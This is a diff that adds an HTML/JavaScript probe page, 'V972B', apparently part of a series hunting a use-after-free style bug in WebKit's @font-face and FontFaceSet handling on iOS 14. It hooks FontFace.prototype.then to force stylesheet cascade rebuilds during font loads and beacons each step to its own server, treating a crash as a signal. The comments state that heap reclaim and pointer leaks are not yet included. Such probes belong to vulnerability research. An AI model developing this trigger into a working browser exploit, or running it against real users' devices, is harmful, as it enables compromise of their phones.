@@ -1,0 +1,191 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+<title>V972B - CSSFontFace cascade rebuild trigger (diagnostic, B)</title>
+</head>
+<body><pre id="out">V972B - CSSFontFace dual-stylesheet cascade rebuild trigger (diagnostic, 14.20)</pre>
+<script>
+/* V972B (SB): Diagnostic verification of the "dual-stylesheet cascade rebuild"
+ * trigger suggested for CSS-connected @font-face / FontFaceSet (WebKit 605.1.15):
+ *  - keep @font-face in #fs (untouched rules set)
+ *  - dirty secondary dummy <style id="ds"> and force layout (offsetHeight)
+ *    inside the FontFace.then getter hook during document.fonts.load()
+ *    => StyleScope update/reconstruct/CSSFontSelector addFontFaceRule/adopt path
+ *
+ * DIAGNOSTIC ONLY (no heap reclaim/readback/pointer leak). Step-beaconed:
+ * hook fired? cascade steps completed? load resolved? crash = no DONE.
+ * Builds on V920 (then-hook did not trigger triggered=0 in that context on 14.20).
+ * Beacon prefix: V972B-
+ */
+'use strict';
+var O = document.getElementById('out');
+function say(s) { O.textContent += '\n' + s; }
+function bk(tag, body) {
+  try {
+    var u = '/beacon/V972B-' + tag + '?d=' + encodeURIComponent(String(body == null ? '' : body).slice(0, 700)) +
+            '&run=' + encodeURIComponent(RUN) + '&t=' + Date.now() + '&s=1';
+    new Image().src = u;
+  } catch (e) {}
+}
+var RUN = 'r' + Date.now().toString(36) + Math.random().toString(36).slice(2,6);
+window.onerror = function (msg, src, line) { bk('ERR', 'onerror:' + String(msg) + '@' + line); return false; };
+
+function sleep(ms) { return new Promise(function (res) { setTimeout(res, ms); }); }
+function j(o) { try { return JSON.stringify(o); } catch (e) { return String(o); } }
+
+function mkFontStyle(id, n, famPrefix) {
+  var st = document.createElement('style');
+  st.id = id;
+  var css = '';
+  for (var i = 0; i < n; i++) {
+    css += '@font-face { font-family: ' + famPrefix + i + '; src: local(Helvetica); unicode-range: U+00' + (0x41 + (i % 26)).toString(16) + '; }\n';
+  }
+  st.textContent = css;
+  document.head.appendChild(st);
+  return st;
+}
+
+function cascadeRebuild(ds, stepTag) {
+  // Dirty secondary dummy stylesheet + force layout/recalc
+  try {
+    bk(stepTag + '-CAS-PRE', 'ds=' + (ds ? 1 : 0));
+    if (ds) {
+      ds.textContent = '/* cascade-rebuild ' + Date.now() + ' ' + Math.random() + ' */ .v972b-dummy { color: rgb(' + (Math.random()*255|0) + ',0,0); }';
+    }
+    // force layout / style recalc
+    void document.body.offsetHeight;
+    void document.body.offsetWidth;
+    void getComputedStyle(document.body).fontFamily;
+    bk(stepTag + '-CAS-OK', 'recalc-forced');
+    return { ok: 1 };
+  } catch (e) {
+    bk(stepTag + '-CAS-EX', String(e && e.name) + ':' + String(e && e.message).slice(0,120));
+    return { ok: 0, ex: String(e && e.name) };
+  }
+}
+
+async function testBaseline() {
+  var r = {};
+  var fs = null, ds = null;
+  try {
+    bk('T1-PRE', 'baseline');
+    fs = mkFontStyle('v972b-fs1', 5, 'v972bbase');
+    ds = document.createElement('style'); ds.id = 'v972b-ds1'; ds.textContent = '/* ds */'; document.head.appendChild(ds);
+    void document.body.offsetHeight;
+    var fonts = await document.fonts.load('1em v972bbase0, v972bbase1, v972bbase2', 'ABC');
+    r.fontsLoaded = fonts ? fonts.length : -1;
+    r.ok = 1;
+  } catch (e) { r.fatal = String(e && e.name) + ':' + String(e && e.message).slice(0,120); }
+  try { if (fs) fs.remove(); if (ds) ds.remove(); } catch(e){}
+  bk('T1-OK', j(r));
+  return r;
+}
+
+async function testThenHookCascade() {
+  var r = { triggered: 0, cas: 0 };
+  var fs = null, ds = null, oldThen;
+  try {
+    bk('T2-PRE', 'then-hook + cascade rebuild inside getter');
+    fs = mkFontStyle('v972b-fs2', 10, 'v972bh');
+    ds = document.createElement('style'); ds.id = 'v972b-ds2'; ds.textContent = '/* ds2 */'; document.head.appendChild(ds);
+    void document.body.offsetHeight;
+
+    var ff = new FontFace('v972bhook', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(ff);
+
+    oldThen = Object.getOwnPropertyDescriptor(FontFace.prototype, 'then');
+    Object.defineProperty(FontFace.prototype, 'then', {
+      configurable: true,
+      get: function () {
+        r.triggered++;
+        bk('T2-HOOK', 'triggered=' + r.triggered);
+        var cr = cascadeRebuild(ds, 'T2H' + r.triggered);
+        if (cr && cr.ok) r.cas++;
+        return undefined; // keep non-thenable behavior (as V920)
+      }
+    });
+
+    bk('T2-LOAD-PRE', 'document.fonts.load');
+    try {
+      var fonts = await document.fonts.load('1em v972bhook, v972bh0, v972bh1, v972bh2, v972bh3', 'ABCDE');
+      r.fontsLoaded = fonts ? fonts.length : -1;
+      r.loadOk = 1;
+    } catch (e) {
+      r.loadErr = String(e && e.name) + ':' + String(e && e.message).slice(0,120);
+    }
+    bk('T2-LOAD-POST', 'fontsLoaded=' + r.fontsLoaded + '|err=' + (r.loadErr || ''));
+  } catch (e) { r.fatal = String(e && e.name) + ':' + String(e && e.message).slice(0,120); }
+
+  try {
+    if (oldThen) Object.defineProperty(FontFace.prototype, 'then', oldThen);
+    else delete FontFace.prototype.then;
+  } catch(e){ try { delete FontFace.prototype.then; } catch(e2){} }
+  try { if (fs) fs.remove(); if (ds) ds.remove(); document.fonts.clear && document.fonts.clear(); } catch(e){}
+  bk('T2-OK', j(r));
+  return r;
+}
+
+async function testExplicitCascadeAroundLoad() {
+  var r = { steps: 0 };
+  var fs = null, ds = null;
+  try {
+    bk('T3-PRE', 'explicit cascade rebuild around load/check (no then-hook dependency)');
+    fs = mkFontStyle('v972b-fs3', 12, 'v972bx');
+    ds = document.createElement('style'); ds.id = 'v972b-ds3'; ds.textContent = '/* ds3 */'; document.head.appendChild(ds);
+    void document.body.offsetHeight;
+
+    cascadeRebuild(ds, 'T3A'); r.steps++;
+    try { var f1 = await document.fonts.load('1em v972bx0, v972bx1, v972bx2', 'ABC'); r.load1 = f1 ? f1.length : -1; } catch(e){ r.load1err = String(e&&e.name); }
+    cascadeRebuild(ds, 'T3B'); r.steps++;
+    try { var c1 = document.fonts.check('1em v972bx0, v972bx3', 'A'); r.check1 = !!c1; } catch(e){ r.check1err = String(e&&e.name); }
+    cascadeRebuild(ds, 'T3C'); r.steps++;
+    try { var f2 = await document.fonts.load('1em v972bx4, v972bx5, v972bx6', 'DEF'); r.load2 = f2 ? f2.length : -1; } catch(e){ r.load2err = String(e&&e.name); }
+    r.ok = 1;
+  } catch (e) { r.fatal = String(e && e.name) + ':' + String(e && e.message).slice(0,120); }
+  try { if (fs) fs.remove(); if (ds) ds.remove(); } catch(e){}
+  bk('T3-OK', j(r));
+  return r;
+}
+
+async function testCascadeChurn() {
+  var r = { churn: 0 };
+  var fs = null, ds = null;
+  try {
+    bk('T4-PRE', 'bounded cascade churn (style dirty + reflow) x20');
+    fs = mkFontStyle('v972b-fs4', 8, 'v972bc');
+    ds = document.createElement('style'); ds.id = 'v972b-ds4'; ds.textContent = '/* ds4 */'; document.head.appendChild(ds);
+    void document.body.offsetHeight;
+    for (var i = 0; i < 20; i++) {
+      cascadeRebuild(ds, 'T4-' + i);
+      r.churn++;
+      if (i % 5 === 0) { try { await document.fonts.load('1em v972bc0, v972bc1', 'A'); } catch(e){} }
+    }
+    r.ok = 1;
+  } catch (e) { r.fatal = String(e && e.name) + ':' + String(e && e.message).slice(0,120); }
+  try { if (fs) fs.remove(); if (ds) ds.remove(); } catch(e){}
+  bk('T4-OK', j(r));
+  return r;
+}
+
+(async function run() {
+  bk('BOOT', 'V972B cssfontface dual-stylesheet cascade rebuild diagnostic; run=' + RUN);
+  try {
+    say('UA=' + navigator.userAgent);
+    bk('UA', navigator.userAgent || '');
+  } catch(e){}
+  await testBaseline();
+  await sleep(150);
+  await testThenHookCascade();
+  await sleep(150);
+  await testExplicitCascadeAroundLoad();
+  await sleep(150);
+  await testCascadeChurn();
+  bk('DONE', 'all-4 complete (diagnostic; no reclaim/readback). hook-triggered==0 => cascade-in-getter path not reached on 14.20 as observed; crash/no-DONE => DoS/signal.');
+  say('DONE run=' + RUN);
+})();
+</script>
+</body>
+</html>
